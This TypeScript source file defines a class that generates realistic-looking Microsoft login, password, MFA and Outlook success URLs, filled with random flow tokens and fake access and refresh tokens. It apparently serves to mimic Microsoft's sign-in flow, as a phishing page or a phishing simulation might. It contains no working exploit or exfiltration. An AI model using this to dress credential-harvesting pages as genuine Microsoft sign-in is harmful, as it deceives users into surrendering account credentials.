// URL Generator for Microsoft-like authentication URLs
export class URLGenerator {
  private static generateRandomString(length: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  private static generateGUID(): string {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  static generateAuthURL(): string {
    const baseURL = 'https://login.microsoftonline.com';
    const tenant = 'common';
    const clientId = this.generateGUID();
    const redirectUri = encodeURIComponent('https://outlook.office.com/mail/');
    const responseType = 'code+id_token';
    const responseMode = 'form_post';
    const scope = encodeURIComponent('https://outlook.office.com/.default openid profile');
    const state = this.generateRandomString(32);
    const nonce = this.generateRandomString(32);
    const codeChallenge = this.generateRandomString(43);
    const codeChallengeMethod = 'S256';
    const prompt = 'login';
    const loginHint = '';
    const domainHint = '';
    const sessionId = this.generateGUID();
    const correlationId = this.generateGUID();
    
    const params = new URLSearchParams({
      client_id: clientId,
      redirect_uri: redirectUri,
      response_type: responseType,
      response_mode: responseMode,
      scope: scope,
      state: state,
      nonce: nonce,
      code_challenge: codeChallenge,
      code_challenge_method: codeChallengeMethod,
      prompt: prompt,
      login_hint: loginHint,
      domain_hint: domainHint,
      sso_reload: 'true',
      client_info: '1',
      x_client_ver: '1.0.0',
      x_client_sku: 'MSAL.JS',
      x_client_cpu: 'x64',
      x_client_os: 'Windows',
      x_client_dm: '1',
      x_ms_lib_ver: '2.0.0',
      session_id: sessionId,
      correlation_id: correlationId,
      mscrid: this.generateRandomString(16),
      sso_nonce: this.generateRandomString(32),
      tx: this.generateRandomString(16),
      flowToken: this.generateRandomString(64),
      canary: this.generateRandomString(8),
      hpgact: '1800',
      hpgid: '1104',
      pgid: 'DstsWebV2',
      ctx: this.generateRandomString(12),
      opid: this.generateRandomString(8),
      uaid: this.generateRandomString(16),
      sso_reload: 'true',
      wctx: this.generateRandomString(24),
      cbcxt: this.generateRandomString(16),
      username: '',
      mkt: 'en-US',
      lc: '1033',
      lic: '1'
    });

    return `${baseURL}/${tenant}/oauth2/v2.0/authorize?${params.toString()}`;
  }

  static generatePasswordURL(email: string): string {
    const baseURL = 'https://login.microsoftonline.com';
    const tenant = 'common';
    const flowToken = this.generateRandomString(64);
    const canary = this.generateRandomString(8);
    const ctx = this.generateRandomString(12);
    const hpgact = '1800';
    const hpgid = '1104';
    
    const params = new URLSearchParams({
      username: email,
      flowToken: flowToken,
      canary: canary,
      ctx: ctx,
      hpgact: hpgact.toString(),
      hpgid: hpgid.toString(),
      pgid: 'DstsWebV2',
      uaid: this.generateRandomString(16),
      mkt: 'en-US',
      lc: '1033',
      slk: 'AAAAAAAAAA',
      ipt: this.generateRandomString(32),
      dpt: this.generateRandomString(32),
      scid: this.generateRandomString(16),
      uiver: '2',
      otc: '2',
      login_hint: email,
      domain_hint: '',
      haschrome: '1',
      hasedge: '1'
    });

    return `${baseURL}/${tenant}/login?${params.toString()}`;
  }

  static generateMFAURL(email: string): string {
    const baseURL = 'https://login.microsoftonline.com';
    const tenant = 'common';
    const flowToken = this.generateRandomString(64);
    const canary = this.generateRandomString(8);
    const ctx = this.generateRandomString(12);
    const authMethodId = this.generateGUID();
    
    const params = new URLSearchParams({
      username: email,
      flowToken: flowToken,
      canary: canary,
      ctx: ctx,
      authMethodId: authMethodId,
      pgid: 'DstsWebV2',
      uaid: this.generateRandomString(16),
      mkt: 'en-US',
      lc: '1033',
      scid: this.generateRandomString(16),
      uiver: '2',
      otc: '2',
      login_hint: email,
      amrValues: 'mfa',
      mfaRequired: 'true',
      strongAuthRequired: 'true',
      proofup: 'true',
      forceotclogin: 'false',
      otcloginfmt: '1',
      uiflavor: 'web',
      desktopsso: 'true',
      isSignupDisallowed: 'false'
    });

    return `${baseURL}/${tenant}/SAS/ProcessAuth?${params.toString()}`;
  }

  static generateSuccessURL(): string {
    const baseURL = 'https://outlook.office.com';
    const sessionId = this.generateGUID();
    const authToken = this.generateRandomString(128);
    const refreshToken = this.generateRandomString(64);
    
    const params = new URLSearchParams({
      authuser: '0',
      session_state: sessionId,
      access_token: authToken,
      refresh_token: refreshToken,
      expires_in: '3600',
      scope: 'https://outlook.office.com/.default',
      token_type: 'Bearer',
      id_token: this.generateRandomString(256),
      client_info: this.generateRandomString(32),
      foci: '1',
      account_id: this.generateGUID(),
      local_account_id: this.generateGUID(),
      realm: 'common',
      environment: 'login.microsoftonline.com',
      home_account_id: this.generateRandomString(32),
      authority_type: 'MSSTS',
      username: '',
      name: '',
      given_name: '',
      family_name: '',
      middle_name: '',
      preferred_username: '',
      oid: this.generateGUID(),
      tid: this.generateGUID(),
      sub: this.generateRandomString(32),
      iss: 'https://login.microsoftonline.com/common/v2.0',
      aud: this.generateGUID(),
      exp: Math.floor(Date.now() / 1000) + 3600,
      iat: Math.floor(Date.now() / 1000),
      auth_time: Math.floor(Date.now() / 1000),
      ver: '2.0'
    });

    return `${baseURL}/mail/?${params.toString()}`;
  }
}